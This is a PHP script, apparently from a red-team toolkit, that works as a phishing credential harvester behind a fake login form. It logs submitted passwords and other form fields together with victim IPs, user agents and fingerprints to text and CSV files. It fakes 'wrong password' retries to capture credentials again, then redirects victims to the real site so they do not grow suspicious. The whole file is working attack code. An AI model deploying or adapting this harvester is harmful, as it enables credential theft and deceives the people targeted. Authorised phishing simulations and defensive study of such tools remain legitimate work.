<?php 
    /*
     * PHP Script intdended to be used during Phishing attempts as a harverster
     * collector linked to backdoored HTML <form> action parameter. Such action
     * parameter could be set like this:
     * 
     *  <form [...] action="/post.php" [...]>
     * 
     * and script named as 'post.php' to get it working. Additional further configurations
     * can be made in the section below.
     * 
     * When crafting HTML login page, one can use the PHP session variable: 
     *      $_SESSION['phished_already']
     *   to add forced redirection to the target site.
     *
     * Authors:
     *  Mariusz Banach / mgeeky
     *  Jakub M. / unkn0w
     *
     * Version:
     *  v0.3
     *
     * Changelog:
     *  - v0.1 - init
     *  - v0.2 - added metadata gathering
     *  - v0.2.1 - unkn0w adds redirection to faked 'wrong password' message
     *  - v0.3 - added CSV reporting method
    */

try {

    /* ============================ CONFIGURATION ============================ */

    // Filename for harvested data. For CSV logging method, the '.csv' fill be appended.
    // Remember to keep the filename not guessable, to avoid forceful browsing against your own
    // phishing box!
    $harvest_filename = 'harvester_phishing_campaign_1234567890.txt';

    // Target to redirect to after collecting input data.
    $redirect = 'https://www.website.to/redirect.to?after=input&data=was&sent=';
    
    // Resend post data to the redirect address? 
    $resend_post_data = false; 
    
    // Specifies how many login attempts user have to try before redirection to real website (must be set to 1 or more)
    $password_retry = 2;

    // URL for "wrong password" message redirection (applicable only if $password_retry is set to more than 1).
    // May be relative URL or full one pointing at the target application's error message directly.
    // Warning: If left empty - the page will be simply reloaded.
    $wrong_password_url = ''; // '/index.php?wrong_pass=1';

    // If this is set to true, everyone regardless of their user agents will be logged.
    // Otherwise, only valid, recognized user agents (exlucding bots, or ones who tamper that
    // setting) will be logged.
    $log_everyone = false;

    // Set this variable to:
    // - 'csv' - to collect results in a CSV format.
    // - 'print_r' - to use the PHP's 'print_r' function.
    // - 'both' - to create two files and use them both.
    $log_format = 'both';

    $csv_separator = ' | ';

    // Specifies whether to include in harvesting log metadata such as User Agent,
    // Remote Addr (victim IP) and so on.
    $show_meta_data = true;

    // Exclude specific clients based on their VISITOR_ID value (16 bytes values):
    $exclude_visitors = array('1234567890abcdef');


    /* ============================ CONFIGURATION ============================ */

    @error_reporting(0);
    
    session_start();
    setcookie(session_name(), session_id(), time() + 7776000); // cookie for 90 days
    
    if (empty($_POST)) {
        header("Location: index.html");
        exit();
    }

    $_SESSION['phishing_counter'] = isset($_SESSION['phishing_counter']) ? $_SESSION['phishing_counter'] + 1 : 1;

    function array_clone($array) {
        return array_map(function($element) {
            return ((is_array($element))
                ? call_user_func(__FUNCTION__, $element)
                : ((is_object($element))
                    ? clone $element
                    : $element
                  )
               );
            }, $array);
    }

    function collect_columns_array($arraylog) {
        $columns = array();   

        foreach($arraylog as $k => $v) {
            if ( $k == 'meta' ) {
                foreach($arraylog[$k] as $k2 => $v2) {
                    array_push($columns, $k2);
                }
            } else {
                array_push($columns, $k);
            }
        }
        return $columns;
    }

    function log_file_init($arraylog) {
        global $log_format;
        global $harvest_filename;
        global $csv_separator;

        if ($log_format == 'both' || $log_format == 'print_r') {
                file_put_contents($harvest_filename, '');
        }
        if ($log_format == 'both' || $log_format == 'csv' ) {
            $columns = implode($csv_separator, collect_columns_array($arraylog));
            file_put_contents($harvest_filename . '.csv', $columns . "\n");
        }
    }

    function log_append($arraylog) {
        global $log_format;
        global $harvest_filename;
        global $csv_separator;

        if ($log_format == 'both' || $log_format == 'print_r') {
            file_put_contents($harvest_filename, print_r($arraylog, true), FILE_APPEND); 
        }
        if ($log_format == 'both' || $log_format == 'csv' ) {
            $columns = collect_columns_array($arraylog);
            $line = '';
            foreach ($columns as $col) {
                if (array_key_exists($col, $arraylog['meta'])) {
                    $line .= $arraylog['meta'][$col] . $csv_separator;
                } else {
                    $line .= $arraylog[$col] . $csv_separator;
                }
            }

            $line = substr($line, 0, -strlen($csv_separator));
            file_put_contents($harvest_filename . '.csv', $line . "\n", FILE_APPEND); 
        }
    }

    $to_report_array = array_clone($_POST);
    $to_report_array['meta'] = array();

    if ( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)
        && $_SERVER['HTTP_X_FORWARDED_FOR'] 
        && $_SERVER['HTTP_X_FORWARDED_FOR'] !== $_SERVER['REMOTE_ADDR']
    ){
        $to_report_array['meta']['HTTP_X_FORWARDED_FOR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } 

    $to_copy_from_server = array("REMOTE_ADDR", "HTTP_REFERER", "HTTP_USER_AGENT", "HTTP_HOST");
    for( $i = 0; $i < count($to_copy_from_server); $i++ ) {
        $to_report_array['meta'][$to_copy_from_server[$i]] = $_SERVER[$to_copy_from_server[$i]];
    }
    
    $date = date('Y-m-d H:i:s');
    $to_report_array['meta']['TIMESTAMP'] = $date;
    
    // Add information about password-entry attempt to the logfile.
    $to_report_array['meta']['COMMENT'] = "Password retries for that user: " . $_SESSION['phishing_counter'] . ". ";
    
    if ($_SESSION['phishing_counter'] >= $password_retry) {
        $to_report_array['meta']['COMMENT'] .= 'Considered phished (+). ';
    }

    // Valid user agents only
    $len = strlen($_SERVER['HTTP_USER_AGENT']);
    $found = 0;
    $keywords = array('Chrome',  'Chromium',  'CriOS',  'Fedora',  'Firefox',  'Gecko',  
                    'Intel',  'iPhone',  'KHTML',  'Linux',  'Macintosh',  'Mobile',  
                    'Mozilla',  'Safari',  'Trident',  'Ubuntu',  'Version',  'Win64',  
                    'Windows',  'WOW64',  'x86_64', 'Android', 'Phone');
    
    for ($i = 0; $i < count($keywords); $i++) {
        if(stripos($_SERVER['HTTP_USER_AGENT'], $keywords[$i]) !== false) {
            $found++;
        }
    }

    // Computing unique per visitor ID to be able to grep harvest log based on that ID.
    $exclude = false;
    $id = sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . $_SERVER['HTTP_ACCEPT'] .
            $_SERVER['HTTP_ACCEPT_CHARSET'] . $_SERVER['HTTP_ACCEPT_LANGUAGE']);
    
    $to_report_array['meta']['VISITOR_ID'] = substr($id, 0, 16);

    if(in_array($to_report_array['meta']['VISITOR_ID'], $exclude_visitors)) {
        $exclude = true;
    }

    if (!$exclude && ($log_everyone || ($found >= 3 && $len > 60))) {
        if(!file_exists($harvest_filename)) {
            log_file_init($to_report_array);
        }
        log_append($to_report_array);
    }

    if(!$show_meta_data) {
        unset($to_report_array['meta']);
    }

    if ($password_retry > 1) {
        if ($_SESSION['phishing_counter'] < $password_retry) {
            $url = (!empty($wrong_password_url))? $wrong_password_url : $_SERVER['PHP_SELF'];
            header('Location: ' . $url);
            die();
        }
    }
    
    if ($_SESSION['phishing_counter'] >= $password_retry) {
        $_SESSION['phished_already'] = 1;
        throw new Exception('Already phished.');    // redirects to target page.
    }

    header('Content-Type: text/html; charset=utf-8');
    if (!$resend_post_data) {
        echo '<meta http-equiv="refresh" content="0; url=' . $redirect . '" />';
    } else {
        echo "<html><head></head><body>";
        echo "<form action='" . $redirect . "' method='post' name='frm'>";
        foreach($_POST as $a => $b ) {
            echo "<input type='hidden' name='" . htmlentities($a) . "' value='" . htmlentities($b) . "'>";
        }
        echo "</form><script type='text/javascript'>document.frm.submit();</script></body></html>";
    }

} catch (Exception $e) {
    // We can't take the risk of not redirecting victim into desired website, 
    // because such victim could become anxious or investigate the issue further
    // thus compromising our campaign. That's the purpose of the try..catch statement
    // applied here.
    echo '<meta http-equiv="refresh" content="0; url=' . $redirect . '" />';
}

?>
